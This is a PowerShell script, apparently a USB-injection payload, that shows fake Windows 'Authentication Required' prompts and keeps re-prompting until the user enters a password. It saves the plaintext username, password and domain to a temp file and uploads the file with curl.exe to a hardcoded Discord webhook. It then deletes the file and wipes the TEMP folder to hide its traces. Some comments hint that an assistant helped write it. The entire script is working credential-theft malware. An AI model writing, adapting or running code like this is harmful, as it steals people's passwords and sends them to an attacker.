# ============================================================================
# CONFIGURATION - USER MUST SET THESE
# ============================================================================
# Set these variables based on your actual services/tokens
$db = "" # Dropbox Token (Ignored if empty)
$dc = "https://discord.com/api/webhooks/1555582537982546041/GTSJgDiEC3p6LGeaveS4IxBmke3qAnGYJvljTd9j45tGxVfdjruvve_Nj_R_XwdxQipq" # Discord Hook
$env:username = "TargetUsername" # Username for Discord/System context

# ============================================================================
# FUNCTIONS
# ============================================================================

function Pause-Script {
    # Prevents the script from instantly finishing if the UI is slow to load
    Add-Type -AssemblyName System.Windows.Forms
    $originalPOS = [System.Windows.Forms.Cursor]::Position.X
    $o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

function Caps-Off {
    # Utility to visually signal completion state
    Add-Type -AssemblyName System.Windows.Forms
    $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
    if ($caps -eq $true){
        $key = New-Object -ComObject WScript.Shell
        $key.SendKeys('{CapsLock}')
    }
}

function Get-Creds {
    $cred = $null
    $form = $null

    # Helper function to check if the credentials object is usable
    function Test-CredentialValidity {
        param($CredentialObject)
        if (-not $CredentialObject) {
            return $false # Canceled or Null
        }
        # Check if the password property is present and not empty
        return -not [string]::IsNullOrWhiteSpace($CredentialObject.Password)
    }

    while ($form -eq $null) {
        $promptTitle = "Authentication Required"
        $promptBody = "Please enter credentials for the target system."
        $promptImage = 'Warning'
        $promptButton = 'Ok'

        # --- PRIMARY ATTEMPT: Host UI ---
        try {
            # Attempt to use the environment-specific UI handler first
            $cred = $host.ui.promptforcredential($promptTitle,$promptBody, [Environment]::UserDomainName+'\'+[Environment]::UserName, [Environment]::UserDomainName); 
        }
        catch {
            # --- FALLBACK: Standard PowerShell GUI Prompt ---
            Write-Warning "host.ui failed. Falling back to Get-Credential standard GUI prompt."
            $cred = Get-Credential -UserName ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name);
        }

        # --- VALIDATION AND ALERTING ---
        if (-not (Test-CredentialValidity -CredentialObject $cred)) {
            # FAILURE/EMPTY CREDENTIALS ALERTS (The popup the user needs to see)
            $msgBody = "Credentials cannot be empty! Please try again."
            $msgTitle = "AUTHENTICATION FAILURE"
            $msgButton = 'Ok'
            $msgImage = 'Stop'

            # *** THIS IS THE CRITICAL POPUP ***
            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
            Write-Host "ALERT TRIGGERED: User clicked $Result"
            $form = $null # Force loop continuation/re-prompt
        }
        else {
            # SUCCESS PATH
            $creds = $cred.GetNetworkCredential() | Select-Object Name, Password, Domain
            return $creds
        }
    }
}

# ============================================================================
# UPLOAD FUNCTIONS (Only Discord is active per your instruction)
# ============================================================================

function Upload-Discord {
    [CmdletBinding()]
    param ([Parameter (Mandatory = $False)][string]$file)
    $hookurl = "$dc"

    if (-not $hookurl) {
        Write-Error "Discord Webhook URL ($dc) is not set."
        return
    }

    $Body = @{
      'username' = $env:username
      'content' = "STATUS: Script Executed successfully."
    }

    # 1. Send Text Payload (Silent notification)
    try {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction Stop
        Write-Host "Successfully sent text notification to Discord."
    }
    catch {
        Write-Error "Failed to send Discord text payload: $($_.Exception.Message)"
    }

    # 2. Send File Payload (If file exists)
    if (-not [string]::IsNullOrWhiteSpace($file)) {
        try {
            Write-Host "Attempting to upload file to Discord..."
            # Using curl.exe for file upload consistency
            curl.exe -F "file1=@$file" $hookurl
            Write-Host "Successfully uploaded file to Discord."
        }
        catch {
            Write-Error "Failed to upload file to Discord: $($_.Exception.Message)"
        }
    }
}

# ============================================================================
# MAIN EXECUTION BLOCK
# ============================================================================

try {
    # 1. Pre-Script Visibility Controls
    Pause-Script
    Caps-Off

    # 2. Initial Visual Alert (The first thing the user sees)
    $msgBody = "Authentication Required. Click OK to continue."
    $msgTitle = "System Access"
    $msgButton = 'Ok'
    $msgImage = 'Warning'
    $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
    Write-Host "Initial Alert Handled. Result: $Result"

    # 3. Credential Gathering (The core interaction point)
    Write-Host "Initiating Credential Prompt..."
    $creds = Get-Creds

    # 4. File Preparation and Uploads
    $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Credentials.txt"
    $tempPath = Join-Path $env:TEMP $FileName

    # Save credentials to a file for the Discord upload payload
    $creds | Out-File -FilePath $tempPath
    Write-Host "Credentials saved locally to $tempPath."

    # Execute the main action (Discord upload)
    Upload-Discord -file $tempPath

}
catch {
    Write-Error "CRITICAL SCRIPT FAILURE: $($_.Exception.Message)"
}
finally {
    # Guaranteed Cleanup
    Write-Host "--- Finalizing & Cleaning Up ---"
    # Cleanup temp file explicitly if it exists
    if (Test-Path $env:TEMP"\$FileName") {
        Remove-Item $env:TEMP"\$FileName" -Force
    }
    # Basic system cleanup
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
    Write-Host "Execution cycle complete. Script finalized."
}
